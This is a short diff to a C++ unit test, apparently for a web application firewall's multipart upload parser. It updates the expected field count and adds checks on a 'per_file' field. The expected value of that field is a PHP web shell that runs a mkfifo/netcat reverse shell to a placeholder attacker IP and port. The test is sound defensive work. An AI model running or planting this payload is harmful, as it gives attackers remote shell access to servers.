@@ -131,11 +131,20 @@ Content-Type: application/x-php
   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
   auto& name_value_map = multi_part.getNameValue();
   auto& name_value_linked = multi_part.getNameValueLinked();
-  EXPECT_EQ(name_value_map.size(), 1);
-  EXPECT_EQ(name_value_linked.size(), 1);
+  EXPECT_EQ(name_value_map.size(), 2);
+  EXPECT_EQ(name_value_linked.size(), 2);
   EXPECT_EQ(name_value_map.find("upload")->second, "sdbdb\n");
+  EXPECT_EQ(
+      name_value_map.find("per_file")->second,
+      R"(<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {random_attacker_ip} {random_attacker_port} >/tmp/f"); ?>)"
+      "\n");
   EXPECT_EQ(name_value_linked[0].first, "upload");
   EXPECT_EQ(name_value_linked[0].second, "sdbdb\n");
+  EXPECT_EQ(name_value_linked[1].first, "per_file");
+  EXPECT_EQ(
+      name_value_linked[1].second,
+      R"(<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {random_attacker_ip} {random_attacker_port} >/tmp/f"); ?>)"
+      "\n");
 
   auto& name_filename_map = multi_part.getNameFileName();
   auto& name_filename_linked = multi_part.getNameFileNameLinked();
